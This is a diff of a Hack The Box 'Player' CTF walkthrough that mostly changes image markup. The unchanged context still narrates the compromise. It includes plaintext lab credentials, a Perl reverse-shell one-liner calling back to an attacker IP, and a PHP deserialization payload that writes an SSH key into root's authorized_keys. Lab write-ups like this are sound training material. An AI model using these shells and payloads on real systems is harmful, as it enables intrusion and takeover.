@@ -96,23 +96,23 @@ Requests/sec.: 78.03855
 
 Check out `/launcher`.
 
-<a class="image-popup">
-![39d1a890.png](/assets/images/posts/player-htb-walkthrough/39d1a890.png)
-</a>
+
+{% include image.html image_alt="39d1a890.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/39d1a890.png" %}
+
 
 ### Sneaky Bastards
 
 Inspecting the HTML source, you'll notice a long string.
 
-<a class="image-popup">
-![a9290bd0.png](/assets/images/posts/player-htb-walkthrough/a9290bd0.png)
-</a>
+
+{% include image.html image_alt="a9290bd0.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/a9290bd0.png" %}
+
 
 And, somewhere in the JavaScript is another long string.
 
-<a class="image-popup">
-![e9c56132.png](/assets/images/posts/player-htb-walkthrough/e9c56132.png)
-</a>
+
+{% include image.html image_alt="e9c56132.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/e9c56132.png" %}
+
 
 At first glance, you might have thought they were the same but look closer, one ends with a `c`, the other ends with a `e`. That got me thinking, what if there's more?
 
@@ -143,9 +143,9 @@ Sneaky bastards!
 
 The string ending with `c` issues a JWT for access. There's something interesting going on with the payload.
 
-<a class="image-popup">
-![655fd5fb.png](/assets/images/posts/player-htb-walkthrough/655fd5fb.png)
-</a>
+
+{% include image.html image_alt="655fd5fb.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/655fd5fb.png" %}
+
 
 Keep this in mind for the time being. Who knows we may need to re-visit this later on?
 
@@ -181,25 +181,25 @@ Voila. There you have it. We better put them into `/etc/hosts`. This is how they
 
 #### chat.player.htb
 
-<a class="image-popup">
-![c18a8afe.png](/assets/images/posts/player-htb-walkthrough/c18a8afe.png)
-</a>
+
+{% include image.html image_alt="c18a8afe.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/c18a8afe.png" %}
+
 
 Interesting conversation going on there. :wink:
 
 #### dev.player.htb
 
-<a class="image-popup">
-![40c7451d.png](/assets/images/posts/player-htb-walkthrough/40c7451d.png)
-</a>
+
+{% include image.html image_alt="40c7451d.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/40c7451d.png" %}
+
 
 Codiad in the house!
 
 #### staging.player.htb
 
-<a class="image-popup">
-![272db3d7.png](/assets/images/posts/player-htb-walkthrough/272db3d7.png)
-</a>
+
+{% include image.html image_alt="272db3d7.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/272db3d7.png" %}
+
 
 As mentioned in the chat above, there are some sensitive files exposed in staging. Let's see if we can uncover them.
 
@@ -280,9 +280,9 @@ Something funky sure is going on...
 
 Recall the chat where Vincent mention the main site was exposing source code. It turns out that one of the PHP files had an orphan left behind.
 
-<a class="image-popup">
-![23562c63.png](/assets/images/posts/player-htb-walkthrough/23562c63.png)
-</a>
+
+{% include image.html image_alt="23562c63.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/23562c63.png" %}
+
 
 Armed with the key and the access code, we can now generate the right JWT to access the early release of PlayBuff. I wrote the following `bash` script to generate the JWT.
 
@@ -308,9 +308,9 @@ eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29
 
 With that, we should be able to access PlayBuff.
 
-<a class="image-popup">
-![2fce9df5.png](/assets/images/posts/player-htb-walkthrough/2fce9df5.png)
-</a>
+
+{% include image.html image_alt="2fce9df5.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/2fce9df5.png" %}
+
 
 ### FFmpeg HLS SSRF Vulnerability
 
@@ -366,15 +366,15 @@ For some reason, I was unable to read `/var/www/staging/fix.php`. Well, screw th
 
 Armed with (`telegen:d-bC|jC!2uepS/w`), let's see if we can log it to one of the SSHs.
 
-<a class="image-popup">
-![433c86b8.png](/assets/images/posts/player-htb-walkthrough/433c86b8.png)
-</a>
+
+{% include image.html image_alt="433c86b8.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/433c86b8.png" %}
+
 
 Holy cow. It works! Too bad the euphoria didn't last long because I'm facing `lshell`. This configuration is extremely restrictive. All commands are forbidden.
 
-<a class="image-popup">
-![c38c40ec.png](/assets/images/posts/player-htb-walkthrough/c38c40ec.png)
-</a>
+
+{% include image.html image_alt="c38c40ec.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/c38c40ec.png" %}
+
 
 See? Nothing is allowed.
 
@@ -382,29 +382,29 @@ See? Nothing is allowed.
 
 This vulnerability almost got me. Notice that `6686/tcp` is running OpenSSH 7.2? The prerequisite for the only exploit (EDB-ID [39569](https://www.exploit-db.com/exploits/39569)) I could find, is `X11Forwarding` has to be enabled. There's no way for me to confirm that without actually trying the exploit. So, let's do this.
 
-<a class="image-popup">
-![4425c449.png](/assets/images/posts/player-htb-walkthrough/4425c449.png)
-</a>
+
+{% include image.html image_alt="4425c449.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/4425c449.png" %}
+
 
 Damn.
 
 The file `user.txt` is at `telegen`'s home directory.
 
-<a class="image-popup">
-![e0340acb.png](/assets/images/posts/player-htb-walkthrough/e0340acb.png)
-</a>
+
+{% include image.html image_alt="e0340acb.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/e0340acb.png" %}
+
 
 This time round we can also read `/var/www/staging/fix.php`.
 
-<a class="image-popup">
-![87d6066f.png](/assets/images/posts/player-htb-walkthrough/87d6066f.png)
-</a>
+
+{% include image.html image_alt="87d6066f.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/87d6066f.png" %}
+
 
 If you are wondering where does this credential (`peter:CQXpm\z)G5D#%S$y=`) belong to, the answer is Codiad (or `dev.player.htb`). Early on, I managed to take a peek at `/var/www/demo/data/users.php`. This is how it looks like.
 
-<a class="image-popup">
-![3a88751f.png](/assets/images/posts/player-htb-walkthrough/3a88751f.png)
-</a>
+
+{% include image.html image_alt="3a88751f.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/3a88751f.png" %}
+
 
 Notice it's commented out? I almost fell for the password-cracking rabbit hole.
 
@@ -412,9 +412,9 @@ Notice it's commented out? I almost fell for the password-cracking rabbit hole.
 
 Now that we have access to Codiad, we can create PHP files. :triumph:
 
-<a class="image-popup">
-![1d670c81.png](/assets/images/posts/player-htb-walkthrough/1d670c81.png)
-</a>
+
+{% include image.html image_alt="1d670c81.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/1d670c81.png" %}
+
 
 With that, we can finally run a reverse shell back. I'm using a Perl one-liner like so.
 
@@ -422,9 +422,9 @@ With that, we can finally run a reverse shell back. I'm using a Perl one-liner l
 perl -e 'use Socket;$i="10.10.14.2";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
 ```
 
-<a class="image-popup">
-![673b212e.png](/assets/images/posts/player-htb-walkthrough/673b212e.png)
-</a>
+
+{% include image.html image_alt="673b212e.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/673b212e.png" %}
+
 
 Bam! And from there, we can `su` to `telegen`, bypassing `lshell` entirely.
 
@@ -432,15 +432,15 @@ Bam! And from there, we can `su` to `telegen`, bypassing `lshell` entirely.
 
 During enumeration of `telegen`'s account, and with the help of `pyspy`, I noticed a periodic execution of PHP under `root`'s context.
 
-<a class="image-popup">
-![d0b4d23b.png](/assets/images/posts/player-htb-walkthrough/d0b4d23b.png)
-</a>
+
+{% include image.html image_alt="d0b4d23b.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/d0b4d23b.png" %}
+
 
 Something interesting caught my attention when I'm at the directory `/var/lib/playbuff`. Check out `buff.php`.
 
-<a class="image-popup">
-![275c98e3.png](/assets/images/posts/player-htb-walkthrough/275c98e3.png)
-</a>
+
+{% include image.html image_alt="275c98e3.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/275c98e3.png" %}
+
 
 We have a PHP serialization vulnerability here! And guess what, `telegen` has write permissions on `merge.log`. In short, we can write data anywhere on the file system as `root`. Let's write a SSH public key we control to `/root/.ssh/authorized_keys`. That should give us access to `root` through SSH.
 
@@ -471,9 +471,9 @@ Tzo4OiJwbGF5QnVmZiI6Mjp7czo3OiJsb2dGaWxlIjtzOjU4OiIuLi8uLi8uLi8uLi8uLi8uLi8uLi8u
 
 A minute later, we should be able log in through SSH as `root`.
 
-<a class="image-popup">
-![4c1baf4e.png](/assets/images/posts/player-htb-walkthrough/4c1baf4e.png)
-</a>
+
+{% include image.html image_alt="4c1baf4e.png" image_src="/5ced4644-e0f0-4fe3-9543-1d517202826e/4c1baf4e.png" %}
+
 
 :dancer:
 
